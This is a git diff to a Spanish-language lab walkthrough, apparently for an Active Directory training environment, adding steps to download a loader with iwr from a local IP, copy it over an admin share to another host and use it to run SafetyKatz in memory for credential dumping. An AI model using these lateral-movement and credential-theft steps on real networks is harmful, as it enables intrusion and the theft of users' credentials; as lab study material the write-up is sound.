@@ -400,4 +400,14 @@ winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
 Pudiendo enumerar el nombre del equipo y del usuario la idea ahora seria extraer las credenciales del usuario, usando SafetyKatz.
-Primero tendremos que 
+Primero tendremos que enviarle Loader.exe a la maquina de dcorp-ci, es una herramienta la cual nos ayudara a poder ejecutar SafetyKatz en memoria, después de ahí la deberemos de copiar a dcorp-mgnt y poder ejecutar SafetyKatz
+
+Nos la copiamos a la maquina dcorp-ci
+```shell
+iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+Y nos la copiamos a dcorp-mgnt
+```shell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
